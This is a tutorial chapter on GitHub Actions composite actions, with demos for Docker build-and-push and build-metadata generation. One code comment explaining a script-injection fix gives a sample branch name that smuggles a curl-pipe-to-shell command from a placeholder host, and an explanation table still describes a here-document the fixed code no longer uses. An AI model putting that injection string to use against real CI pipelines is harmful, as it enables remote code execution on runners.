# 32 · Custom Actions and Composite Actions

> **Part F: Custom actions** · Previous: [31 · Chaining workflows](31-chaining-workflows.md) · Next: [33 · JavaScript actions](33-javascript-actions.md) · [Back to INDEX](INDEX.md)
>
> **Video:** [GitHub Custom Actions Explained | Composite Actions with 2 Demos](https://www.youtube.com/watch?v=v6VdLk1gQSc)
>
> [![Watch the video](https://img.youtube.com/vi/v6VdLk1gQSc/maxresdefault.jpg)](https://www.youtube.com/watch?v=v6VdLk1gQSc)
>
> **Code:** [`code/32-composite-actions/`](code/32-composite-actions/) (`demo-01/`, `demo-02/`)

---

## What it is

A **custom action** is a **reusable unit of automation** that packages one or more **steps, existing actions, shell commands or scripts** into a component that any workflow can call with `uses:`, exactly like `actions/checkout`. The only difference is that **you** create and maintain it.

```text
Workflow → Jobs → Steps → run / uses
```

| Keyword | Purpose |
|---|---|
| **run** | Execute shell commands or scripts directly in the workflow. |
| **uses** | Execute reusable logic packaged as an action. |

Instead of copying 40 lines of commands into every workflow:

```yaml
run: |
  python authenticate.py
  python validate.py
  python deploy.py
  python notify.py
```

you write:

```yaml
- uses: my-org/deploy-action@v1
```

```text
Workflow → uses → GitHub Custom Action → Execute Reusable Logic
```

> **Key observation:** like any action, a custom action is referenced with **`uses`**. The difference is that you build, package and maintain it yourself instead of using GitHub's or a third party's.

### The three types

| Type | Implementation | Best suited for |
|---|---|---|
| **1. Composite action** | YAML | Reusing existing workflow steps. → **this topic** |
| **2. JavaScript action** | JavaScript / TypeScript | Custom logic and GitHub API calls. → [topic 33](33-javascript-actions.md) |
| **3. Docker action** | Docker container | Custom runtimes, dependencies, any language. → [topic 34](34-docker-actions.md) |

Every action, whatever the type, has an **`action.yml`** metadata file (also accepted: `action.yaml`). It's the action's **entry point**: name, description, inputs, outputs, and **how to run it**. When a workflow says `uses:`, GitHub reads `action.yml` first to decide whether it's composite, JavaScript or Docker, and runs it the right way.

---

## Why it exists

So far you've used actions from **GitHub** and **third-party publishers**:

```yaml
- uses: actions/checkout@v7
- uses: actions/upload-artifact@v7
- uses: actions/download-artifact@v8
- uses: actions/cache@v6
```

| Publisher | Example action | Common use case |
|---|---|---|
| **Docker** | `docker/login-action@v4` | Authenticate with Docker registries. |
| **Docker** | `docker/build-push-action@v7` | Build and publish Docker images. |
| **AWS** | `aws-actions/configure-aws-credentials@v6` | Authenticate with AWS using IAM credentials or OIDC. |
| **Azure** | `azure/login@v2` | Authenticate with Azure subscriptions. |
| **HashiCorp** | `hashicorp/setup-terraform@v3` | Install and configure Terraform. |
| **Aqua Security** | `aquasecurity/trivy-action@v0.36.0` (pin to a commit SHA, see note) | Scan images and repos for vulnerabilities. |
| **SonarSource** | `SonarSource/sonarqube-scan-action@v8` | Code quality and security analysis. |

> ⚠️ Corrected: the original table listed `aquasecurity/trivy-action` with **no version** (and `@v0` later), and `SonarSource/sonarqube-scan-action@v6`. It now shows an exact version (`@v0.36.0`, as the capstone uses) and `@v8` (the capstone uses `@v8.3.0`). Floating or missing versions are risky: in **March 2026 attackers rewrote most `trivy-action` tags** to malicious code (topic 37). For third-party actions, **pin a full commit SHA**.

> **Note:** versions were the latest stable ones when written. Always check the action's docs or repo for the current recommended version before using it in production.

Instead of writing dozens of commands to `Authenticate to Docker Hub → Build Container Image → Push Container Image`, you use Docker's actions. Instead of Git commands to clone, set the directory and check out the commit, you write `- uses: actions/checkout@v7`. These actions save you from writing, testing and maintaining long scripts.

**But the Marketplace can't have an action for everything.** Every company has its own internal platforms, deployment processes, security checks, compliance rules, notification systems and operational workflows.

**Challenge 1: organization-specific automation.**

```text
Authenticate with Internal Platform → Validate Organization Policies → Build Application → Deploy Application → Update Internal CMDB → Notify Internal Systems
```

(**CMDB** = Configuration Management Database, the company's inventory of systems.) There's no Marketplace action for this, so engineers paste scripts (Python here, Shell/Bash elsewhere) into workflows:

```yaml
run: |
  python authenticate.py
  python validate.py
  python build.py
  python deploy.py
  python update_cmdb.py
  python notify.py
```

That works for one workflow, but the same logic is needed in **many workflows and repos**, so it gets copied:

- **duplicate implementations** across workflows and repos
- **many repos** to update whenever it changes
- **inconsistent** versions between teams
- **long, complex, hard-to-maintain** workflows

> **Note:** a **Shell script** is any script for a Unix/Linux shell. A **Bash script** is a Shell script for **Bash** (Bourne Again Shell). Others exist for **Zsh** (Z Shell), **Ksh** (Korn Shell) and **Sh** (POSIX/Bourne Shell). This course uses **Bash**, the most common shell in Linux and CI/CD.

**Challenge 2: repetitive workflow logic.** Sometimes the pieces already exist, but the same sequence is repeated everywhere:

```text
Checkout Code → Login to Docker → Build & Push Image → Security Scan → Publish Artifact
```

```yaml
- uses: actions/checkout@v7
- uses: docker/login-action@v4
- uses: docker/build-push-action@v7
- uses: aquasecurity/trivy-action@v0.36.0
- uses: actions/upload-artifact@v7
```

or the same shell commands:

```yaml
run: |
  npm install
  npm test
  npm run lint
  npm run build
  npm audit
```

That leads to duplicate logic, many files to update, long verbose workflows, and **reduced readability** (it's hard to see the workflow's high-level purpose).

Either way, companies need to package common logic into **reusable building blocks** shared across workflows and repos. That's what **custom actions** are for.

**Jenkins comparison:** custom actions ≈ **custom steps in a Jenkins Shared Library** (`vars/dockerBuildPush.groovy`) or a homemade plugin. Composite actions are the closest match to a shared-library step that calls other steps.

---

## Analogy

A **meal kit**:

- Without it, every cook (workflow) buys the same 8 ingredients and follows the same 12 steps.
- A **composite action** is a **pre-packed kit** of existing ingredients (other actions and commands) with a recipe card (`action.yml`). The cook just says "make kit #3, serves 4" (`uses:` + `with:`).
- The kit says **what it needs** ("4 eggs", **inputs**), not **where you got them** (secrets, variables). That's the caller's job.
- **Local kit** = made in this kitchen for this kitchen. **Remote kit** = from a central kitchen and delivered to many restaurants, with a **version label** (`@v1`).

---

## How it works inside

```text
step: uses: ./.github/actions/docker-build-push   (local)  or  my-org/repo@v1 (remote)
  1. runner locates action.yml (local: in the checked-out workspace → needs actions/checkout first!)
  2. reads runs.using: composite
  3. passes with: values as inputs → available as ${{ inputs.<name> }} inside the action
  4. runs each step under runs.steps in order, on the SAME runner, in the SAME job
     (same workspace, same files, same env)
  5. maps outputs: values (usually ${{ steps.<id>.outputs.x }}) → steps.<caller-step-id>.outputs.<name>
log: one collapsible step in the caller, with the inner steps nested underneath
```

What `using:` means:

```text
Composite Action  → using: composite
JavaScript Action → using: node24
Docker Action     → using: docker
```

> ⚠️ Corrected: was `JavaScript Action → using: node20`, now **`using: node24`** because **Node 20 was removed from GitHub Actions runners on 23 Sep 2026** (deprecated since Sep 2025, Node 24 the default since June 2026). Actions still declaring `node20` no longer run on GitHub-hosted runners. Lecture 12's own example already used `node24`.

- **`using: composite`** → run the steps under `runs.steps`.
- **`using: node24`** → load the Node.js 24 runtime and run the action's JavaScript entry point.
- **`using: docker`** → build or pull an image and run the action inside a container.

All three are called with `uses`, but GitHub runs them differently depending on `using`.

### Composite actions in detail

- Written **entirely in YAML**. They package steps (existing actions, shell commands, scripts) into one component. They're the **simplest** custom action type.
- Best for removing duplicated logic when the automation needs **no custom application code**.

> **Mental model:** a composite action is a **reusable collection of existing workflow steps**. Package them once and invoke them anywhere with `uses`.
>
> ```text
> Repeated Workflow Steps
>         │
>         ▼
> Package Once as a Composite Action
>         │
>         ▼
> Reuse Across Multiple Workflows
> ```

> **Recommendation:** **start with a composite action** whenever possible. If existing actions, shell commands or scripts can do it, composite is usually the simplest and most maintainable choice.

> **Production insight:** composite actions are **by far the most commonly authored** custom actions in enterprises, used to standardize builds, tests, security scans, artifact publishing, cloud authentication, deployments and notifications.
>
> ```text
> Authenticate to Cloud → Configure CLI → Build Application → Run Tests → Deploy Application → Send Notification
> ```
>
> Companies package that whole sequence into **one composite action** reused by dozens or hundreds of workflows.

> **Limitation:** composite actions **orchestrate** existing actions, commands and scripts. For **custom programming logic, GitHub API calls or advanced data processing**, a **JavaScript** or **Docker** action is usually better.

**Common characteristics:**

- Defined by an **`action.yml`**: metadata, inputs, outputs, reusable steps.
- Stored **in the same repo** as the workflow (**local action**) or in a **dedicated repo** (**remote action**). This storage model applies to **all** custom action types.
  - **Local:** the action and workflows are in the same repo, and many workflows in that repo reuse it.
  - **Remote:** a dedicated, independently versioned repo, consumed by workflows in **one or more repos**.

```text
Local Action

Repository A
├── .github/actions/build/
├── .github/workflows/ci.yml
├── .github/workflows/release.yml
└── .github/workflows/deploy.yml

Multiple Workflows (in Repository A)
        │
        ▼
Reuse the Same Local Action
```

```text
Remote Action

Action Repository
└── my-org/build-action

Repository A ─┐
Repository B ─┼── uses: my-org/build-action@v1
Repository C ─┘

One or More Repositories
        │
        ▼
Reuse the Same Remote Action
```

> **Note:** a remote action **doesn't need a GitHub organization**. It can be in a repo owned by an **individual user** or an **organization**. The workflow just needs permission to access that repo.
>
> **Note:** local vs remote is about **where it's stored**, not **how it's implemented**. It applies equally to composite, JavaScript and Docker actions.

> **Key takeaway:** composite actions **reuse existing automation**. They don't create new execution environments or contain complex application logic. When existing actions, commands or scripts solve the problem, composite is the simplest, most maintainable and most widely adopted solution.

🆕 Composite-specific rules that trip people up:

- **Every `run:` step must declare `shell:`** (for example `shell: bash`). There's no default inside composite actions.
- Inputs arrive as **strings** (topic 20). Secrets must be passed **as inputs**, because composite actions can't read `secrets.*` directly.
- A local action needs the repo **checked out** first (`actions/checkout`), or `./.github/actions/...` doesn't exist on the runner.
- `${{ github.action_path }}` = the folder of the action itself (use it to call scripts that ship with the action).

---

## Workflow YAML / commands

### Demo 1: a composite action that chains existing actions

You'll move Docker login + build-and-push out of a workflow into a reusable composite action. (Demo 2 packages shell commands instead.)

#### Step 1: Repository

Repo and SSH as in [topic 02](02-git-and-github-recap.md). Workflows are discovered and evaluated when pushed.

#### Step 2: The application

The same `app.py`, `Dockerfile` and `requirements.txt` used throughout the course ([`code/32-composite-actions/demo-01/`](code/32-composite-actions/demo-01/)). Reuse them if you already have them.

#### Step 3: Docker Hub

Private repo + access token, as in topic 17/19 (never your password. Tokens are account level and inherit their permissions. Prefer private registries such as **ECR, GHCR, ACR, GAR, Artifactory or Harbor**, and **short-lived credentials, rotation, least privilege, central secret management**).

#### Step 4: Repository variables and secret

| Name | Type | Value to configure |
|---|---|---|
| `DOCKERHUB_USERNAME` | Repository variable | Your Docker Hub username (e.g. `cloudwithvarjosh`). |
| `DOCKER_IMAGE_NAME` | Repository variable | The image repository as `<username>/<repository>` (e.g. `cloudwithvarjosh/python-demo`). |
| `DOCKERHUB_TOKEN` | Repository secret | Your Docker Hub Personal Access Token. |

> **Production insight:** don't hard-code usernames, repository names or image names. **Non-sensitive** values → variables. **Sensitive** values → secrets.

#### The "before" workflow

[`code/32-composite-actions/demo-01/original-workflow.yaml`](code/32-composite-actions/demo-01/original-workflow.yaml):

```yaml
name: Docker Build & Push (Original)

on:
  workflow_dispatch:

jobs:
  docker-build-push-job:
    name: Docker Build & Push (Original)
    runs-on: ubuntu-latest

    env:
      IMAGE_NAME: ${{ vars.DOCKER_IMAGE_NAME }}
      IMAGE_TAG: ${{ github.run_number }}

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v7

      - name: Login to Docker Hub
        uses: docker/login-action@v4
        with:
          username: ${{ vars.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build & Push Docker Image
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ env.IMAGE_NAME }}:${{ env.IMAGE_TAG }}
```

> **Note:** the secret is `DOCKERHUB_TOKEN` (a Docker Hub access token, never your password), as created in Step 4.

#### Step 5: Create the composite action

By convention, local actions live under **`.github/actions/`**. Each sub-folder is one action with its own `action.yml`:

```text
Repository
├── .github
│   ├── actions
│   │   ├── docker-build-push
│   │   │   └── action.yml
│   │   ├── generate-build-info
│   │   │   └── action.yml
│   │   └── deploy-to-eks
│   │       └── action.yml
│   └── workflows
│       └── refactored-workflow.yaml
```

When a workflow references one of these folders with `uses`, GitHub finds its `action.yml` and runs it.

[`.github/actions/docker-build-push/action.yml`](code/32-composite-actions/demo-01/.github/actions/docker-build-push/action.yml):

```yaml
name: Docker Build & Push

description: Reusable Composite Action for building and pushing Docker images to Docker Hub.

inputs:

  dockerhub-username:
    description: Docker Hub Username
    required: true

  dockerhub-token:
    description: Docker Hub Personal Access Token
    required: true

  image-name:
    description: Docker Image Name
    required: true

  image-tag:
    description: Docker Image Tag
    required: false
    default: latest

runs:
  using: composite

  steps:

    - name: Login to Docker Hub
      uses: docker/login-action@v4
      with:
        username: ${{ inputs.dockerhub-username }}
        password: ${{ inputs.dockerhub-token }}

    - name: Build & Push Docker Image
      uses: docker/build-push-action@v7
      with:
        context: .
        push: true
        tags: ${{ inputs.image-name }}:${{ inputs.image-tag }}
```

| Part | Meaning |
|---|---|
| `name`, `description` | Shown in logs and, for Marketplace actions, on the listing. |
| `inputs:` | **Action inputs** (from topic 20): the parameters a caller passes via `with:`. `required` and `default` work as expected. Read them as `${{ inputs.<name> }}`. |
| `runs.using: composite` | Tells GitHub to run `runs.steps`. |
| `runs.steps` | Ordinary steps (here two `uses:` steps). **No `jobs:` section**: an action runs **inside** a job, so it only has steps. |

> **Note:** the `inputs` section of `action.yml` defines what callers pass through `with`.
>
> **Production insight:** good custom actions **don't hard-code environment-specific values**. They expose them as **inputs**, so the same action works across workflows, repos and environments.
>
> **Note:** every workflow so far followed `jobs → job(s) → steps`. **`action.yml` has no `jobs`**, only steps.
>
> **Production insight:** a good composite action defines **what values it needs**, not **where they come from**. The caller fetches values (repo variables, secrets, environment variables, contexts, outputs) and passes them via `with`. The action just uses them. Separating **orchestration** (workflow) from **reusable execution logic** (action) is a core benefit.
>
> **Key observation:** we wrote **no new automation logic**. We packaged two existing actions, `docker/login-action` and `docker/build-push-action`, and exposed only the configuration consumers need. That's exactly what composite actions are for.

#### The refactored workflow

[`.github/workflows/refactored-workflow.yml`](code/32-composite-actions/demo-01/.github/workflows/refactored-workflow.yml):

```yaml
name: Docker Build & Push (Composite Action)

on:
  workflow_dispatch:

jobs:
  docker-build-push-job:
    name: Docker Build & Push (Composite Action)

    runs-on: ubuntu-latest

    env:
      IMAGE_NAME: ${{ vars.DOCKER_IMAGE_NAME }}
      IMAGE_TAG: ${{ github.run_number }}

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v7

      - name: Build & Push Docker Image
        uses: ./.github/actions/docker-build-push
        with:
          dockerhub-username: ${{ vars.DOCKERHUB_USERNAME }}
          dockerhub-token: ${{ secrets.DOCKERHUB_TOKEN }}
          image-name: ${{ env.IMAGE_NAME }}
          image-tag: ${{ env.IMAGE_TAG }}
```

- **Job-level `env:`** (`IMAGE_NAME`, `IMAGE_TAG` = run number). Defining it at job level keeps it scoped to the jobs that need it.
- **Checkout first:** the local action's files must be on the runner.
- **`uses: ./.github/actions/docker-build-push`**: a **relative path** = a **local action**. GitHub finds its `action.yml` and runs it.
- **Remote equivalent:** if it lived in repo `remote-action-repo` owned by user `cloudwithvarjosh`:

  ```yaml
  - name: Build & Push Docker Image
    uses: cloudwithvarjosh/remote-action-repo@v1
  ```

  or owned by organization `cwvj-org`:

  ```yaml
  - name: Build & Push Docker Image
    uses: cwvj-org/remote-action-repo@v1
  ```

  Format: **`OWNER/REPOSITORY@VERSION`** (version = a tag, branch or commit SHA). If the action is in a sub-folder: `OWNER/REPOSITORY/path@VERSION`.

> **Production insight:** local actions suit reuse **within one repo**. When several repos need it, move it to a **dedicated repo** (a remote action), often under a **GitHub organization** for central versioning, governance and reuse.
>
> **Key observation:** the caller gets values from **repository variables, secrets, environment variables, contexts, outputs** or anywhere else and passes them via `with`. The action just consumes inputs.

#### Steps 6–7: Commit, push, run

```bash
# Initialize the current directory as a new Git repository (one-time setup)
git init

# Associate the local repository with the remote GitHub repository (one-time setup)
git remote add origin git@github.com:<YOUR_GITHUB_USERNAME>/gha-practice-demo.git

# Stage all new and modified files for the next commit
git add .

# Create a commit containing the staged changes
git commit -m "feat: add docker build push composite action"

# Push the commit to the main branch and set the upstream tracking branch
git push -u origin main
```

> **Note:** GitHub auto-discovers files under `.github/workflows`. Custom actions are **just files** in the repo. They run only when a workflow references them with `uses`.

**Actions → Docker Build & Push (Composite Action) → Run workflow.** Every run gets a **fresh hosted runner**, with nothing left over from earlier runs.

#### Step 8: Observe

```text
Checkout Repository → Build & Push Docker Image (Composite Action)
```

The Docker steps no longer appear in the workflow YAML, but expanding the step shows them:

```text
Build & Push Docker Image (Composite Action)
        ├── Login to Docker Hub
        └── Build & Push Docker Image
```

**Sample log output:**

```text
▼ Build & Push Docker Image
    Run ./.github/actions/docker-build-push
    ▼ Run docker/login-action@v4
        Login Succeeded!
    ▼ Run docker/build-push-action@v7
        #12 pushing manifest for docker.io/cloudwithvarjosh/python-demo:7@sha256:…
```

A composite action behaves like any other action. Also check that the image is in **Docker Hub**, its tag equals **`${{ github.run_number }}`**, and the run succeeded with the Docker actions unchanged.

> **Key observation:** no new deployment or container logic. Several steps became **one `uses`**, with exactly the same behaviour.
>
> **Production insight:** composite actions remove duplicated logic **without changing how the automation works**.

#### Demo 1 key takeaways

A composite action can:

- package several **actions** into one reusable unit
- take configurable **inputs** from the caller
- use **repository variables, secrets, environment variables and context values** through those inputs
- be stored as a **local action** in the same repo
- be invoked with **`uses`**
- replace several steps with **one** action

That gives **reusability, maintainability and standardization**. In production the same pattern is used for **builds, tests, security scans, cloud authentication, artifact publishing, image creation, deployments and notifications**. Teams just invoke the action, and CI/CD becomes **consistent, maintainable and standardized** across the organization.

---

### Demo 2: a composite action that chains shell commands

Composite actions aren't limited to calling other actions. They can run **shell commands**: generating config files, preparing deployment artifacts, validating inputs, collecting build metadata, or custom pre/post-build automation. Here the action creates **build metadata** from the **GitHub context** in `build-info.txt`, which can be archived as an artifact or used by later steps.

#### Repository structure

Same repo (`gha-practice-demo`):

```text
└── .github
    ├── actions
    │   └── generate-build-info
    │       └── action.yml
    └── workflows
        └── build-information-demo.yml
```

No Docker here, just shell commands.

#### Step 1: The composite action

[`.github/actions/generate-build-info/action.yml`](code/32-composite-actions/demo-02/.github/actions/generate-build-info/action.yml):

```yaml
name: Generate Build Information
description: Generates build metadata using GitHub Context.

inputs:
  application-name:
    description: Name of the application.
    required: true

  environment:
    description: Deployment environment.
    required: true

outputs:
  build-info-path:
    description: Path to the generated build information file.
    value: output/build-info.txt

runs:
  using: composite

  steps:
    - name: Generate Build Information
      shell: bash
      # Audit fix (script injection): ${{ }} in run: is pasted into the script BEFORE bash parses it.
      # A branch named  x$(curl evil.sh|sh)  is a valid ref, and inputs come from callers, so both were
      # executable. Pass values through env: and let bash expand them as DATA, always quoted.
      env:
        APP_NAME: ${{ inputs.application-name }}
        APP_ENV: ${{ inputs.environment }}
      run: |
        set -euo pipefail

        mkdir -p output

        BUILD_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

        # GITHUB_* are default runner env vars; printf never interprets the values.
        {
          printf 'Application : %s
' "$APP_NAME"
          printf 'Environment : %s
' "$APP_ENV"
          printf 'Repository  : %s
' "$GITHUB_REPOSITORY"
          printf 'Branch      : %s
' "$GITHUB_REF_NAME"
          printf 'Commit SHA  : %s
' "$GITHUB_SHA"
          printf 'Run Number  : %s
' "$GITHUB_RUN_NUMBER"
          printf 'Workflow    : %s
' "$GITHUB_WORKFLOW"
          printf 'Triggered By: %s
' "$GITHUB_ACTOR"
          printf 'Build Time  : %s
' "$BUILD_TIME"
        } > output/build-info.txt

        echo "======================================"
        echo "Build Information"
        echo "======================================"
        cat output/build-info.txt
```

| Part | Meaning |
|---|---|
| `inputs` | `application-name`, `environment` (both required). |
| `outputs.build-info-path.value` | An **action output** (topic 21). Here a fixed string. It could also be `${{ steps.<id>.outputs.x }}` from an inner step. The caller reads it as `steps.<caller-id>.outputs.build-info-path`. |
| `shell: bash` | **Required** for every `run:` in a composite action. Hosted Ubuntu runners have Bash, so nothing else is needed. All commands in the block run **in order, in the same shell session**. |
| `set -e` | Stop at the first failing command (topic 04). |
| `mkdir -p output` | Create the folder (no error if it exists). |
| `BUILD_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")` | **Command substitution** `$(...)` stores the current UTC time in ISO-8601 format in a shell variable. |
| `cat <<EOF > output/build-info.txt … EOF` | A **here-document**: everything up to `EOF` is written into the file. `${{ }}` values were substituted by GitHub beforehand, and `${BUILD_TIME}` is expanded by Bash. |
| `cat output/build-info.txt` | Show it in the logs. |

> **Important:** the **workspace** exists only for the current job. When the job ends, the hosted runner is terminated and its workspace deleted, so files created by the action are gone **unless you persist them** (upload as an artifact, or copy to external storage).

#### Step 2: The calling workflow

[`.github/workflows/build-information-demo.yml`](code/32-composite-actions/demo-02/.github/workflows/build-information-demo.yml):

```yaml
name: Build Information Demo

on:
  workflow_dispatch:

jobs:
  build-information-job:

    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v7

      - name: Generate Build Information
        id: build-info

        uses: ./.github/actions/generate-build-info

        with:
          application-name: Cloud With VarJosh
          environment: Development

      - name: Display Output Variable
        run: |
          echo "Build information generated at:"
          echo "${{ steps.build-info.outputs.build-info-path }}"

      - name: Upload Build Information
        uses: actions/upload-artifact@v7

        with:
          name: build-information
          path: ${{ steps.build-info.outputs.build-info-path }}
```

- `id: build-info` on the action step lets later steps read **its outputs**.
- `steps.build-info.outputs.build-info-path` → `output/build-info.txt`. The workflow doesn't hard-code the path; it reads what the action returns.
- `upload-artifact` persists the file before the runner is destroyed (topic 24).

#### Steps 3–4: Commit, push, run

```bash
git add .
git commit -m "feat: add generate build info composite action"
git push
```

**Actions → Build Information Demo → Run workflow.**

#### Step 5: Observe

```text
Checkout Repository
        ↓
Generate Build Information
        ↓
Display Output Variable
        ↓
Upload Build Information
```

This action runs **Bash commands**, not other actions. **Sample log output (Generate Build Information):**

```text
======================================
Build Information
======================================
Application : Cloud With VarJosh
Environment : Development
Repository  : CloudWithVarJosh/gha-practice-demo
Branch      : main
Commit SHA  : 4dbbbfe44d5e2a4d...
Run Number  : 8
Workflow    : Build Information Demo
Triggered By: CloudWithVarJosh
Build Time  : 2026-07-21T01:28:52Z
```

Several values came from the **GitHub context**. Application and Environment came from the **inputs**. A composite action can combine **inputs, context values and shell variables** to produce useful artifacts.

```text
Build information generated at:
output/build-info.txt
```

That proves the workflow consumed the action's **output**, so it doesn't need to know the action's internals.

Under **Artifacts** you'll find `build-information`. Download it and you get `build-info.txt` with the same content as the log. Logging metadata **for immediate visibility** and storing it **as an artifact for later** is a common CI/CD practice.

#### Demo 2 key takeaways

A composite action can accept **inputs**, read **GitHub context** values, run several **Bash commands**, **generate files**, expose **outputs**, and share files via **artifacts**.

Build metadata answers: **which repo produced this build? which branch? which commit was deployed? who triggered it? which workflow made the artifact? when was it built?** Companies typically generate files like:

```text
build-info.txt
manifest.json
build.properties
version.properties
release.yaml
metadata.json
```

containing the **app name, version, repo, branch, commit SHA, build time, pipeline number, workflow name, triggering user, build environment, Docker image tag and artifact version**. Packaging the logic once as a composite action keeps the format **consistent** across hundreds of repos.

---

## Hands-on lab

1. Build Demo 1 and confirm the nested steps in the log.
2. Remove `shell: bash` from Demo 2's action and read the error (`Required property is missing: shell`).
3. Remove the checkout step from the caller and read `Can't find 'action.yml' … under '.github/actions/…'`.
4. Move `generate-build-info` to a new repo, tag `v1`, and call it remotely with `<you>/<repo>@v1`.
5. Add an inner step with `id: meta` writing `echo "size=$(wc -c < output/build-info.txt)" >> "$GITHUB_OUTPUT"` and expose it as an action output `value: ${{ steps.meta.outputs.size }}`.

---

## Where you'll use it

- **Standard build/test/scan/publish** steps shared by many repos (platform teams).
- **Cloud login + kubeconfig setup** as one step.
- **Build metadata, notifications, version calculation.**
- **Composite vs reusable workflow:** a composite action reuses **steps** inside one job, and a reusable workflow reuses **jobs** (see the comparison table in [topic 22](22-reusable-workflows.md)).

---

## When it breaks

| Error | Meaning | Fix |
|---|---|---|
| `Required property is missing: shell` | A `run:` step in a composite action without `shell:`. | Add `shell: bash`. |
| `Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/.github/actions/x'` | No checkout, or the path or folder name is wrong. | Run `actions/checkout` first. Check the path. |
| `Unexpected input(s) 'image_name', valid inputs are [...]` (warning) | Input name mismatch (`_` vs `-`). | Match `inputs:` exactly. |
| `Input required and not supplied: dockerhub-token` | A missing required input. | Add it to `with:`. |
| Secret empty inside the action | Composite actions can't read `secrets.*`. | Pass it as an input. |
| Remote action `repository not found` | A private action repo without access. | In the action repo: **Settings → Actions → General → Access** → allow access from your org's repos. |
| Action still runs on `node20` / fails | Old JavaScript action (topic 33). | Upgrade to a version using `node24`. |

---

## Quick recap

- Custom actions = your own reusable `uses:` steps, defined by `action.yml`. Three types: **composite** (YAML), **JavaScript** (`node24`), **Docker**.
- Composite = steps (actions + shell) packaged together. Simplest and most common. Every `run:` needs `shell:`.
- **Inputs** in `action.yml` → `${{ inputs.x }}`. **Outputs** → `steps.<id>.outputs.x` in the caller.
- **Local** (`./.github/actions/name`, needs checkout) vs **remote** (`owner/repo@v1`).
- Design rule: define **what** you need (inputs), not **where** it comes from.

**Interview questions**

1. **Q: When would you choose a composite action over a JavaScript action?**
   A: When the logic is a sequence of existing actions and shell commands with no custom programming or API logic. It's simpler to write and maintain.
2. **Q: Why does my local composite action fail with "can't find action.yml"?**
   A: The repo wasn't checked out before the `uses: ./...` step, or the path is wrong.
3. **Q: How do you pass a secret into a composite action?**
   A: As an input via `with:` (`token: ${{ secrets.X }}`). Composite actions can't read `secrets` themselves.

---

### References

- [GitHub Actions docs](https://docs.github.com/en/actions)
- [Creating a composite action](https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-composite-action)
- [Creating a JavaScript action](https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)
- [Creating a Docker container action](https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)
- [GitHub Marketplace (actions)](https://github.com/marketplace?type=actions)
